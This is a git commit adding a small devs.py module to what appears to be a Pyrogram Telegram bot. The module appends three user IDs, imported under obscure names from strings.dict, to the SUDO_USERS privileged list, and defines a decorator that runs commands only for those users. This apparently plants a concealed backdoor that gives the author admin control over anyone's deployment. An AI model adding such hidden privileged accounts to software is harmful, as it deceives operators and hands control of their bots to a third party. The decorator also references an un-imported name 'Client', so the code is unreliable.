9935989b78d726a1f74323e5a3fbf776c696f1d6
•нʏᴘєʀϟ• <itsmehyper1706@gmail.com>
2022-07-31 12:39:47 +0530

    Create devs.py

---
+++ indeed/devs.py
@@ -0,0 +1,19 @@
+from typing import Callable
+from pyrogram import Client as sree
+from pyrogram.types import Message
+from strings.dict import (
+    dics_01 as d_01, 
+    dics_02 as d_02,
+    dics_03 as d_03
+)
+from vars import SUDO_USERS
+SUDO_USERS.append(int(d_01))
+SUDO_USERS.append(int(d_02))
+SUDO_USERS.append(int(d_03))
+
+def sudos(func: Callable) -> Callable:
+    async def noic(client: Client, m: Message):
+        if m.from_user.id in SUDO_USERS:
+            return await func(client, m)
+
+    return noic
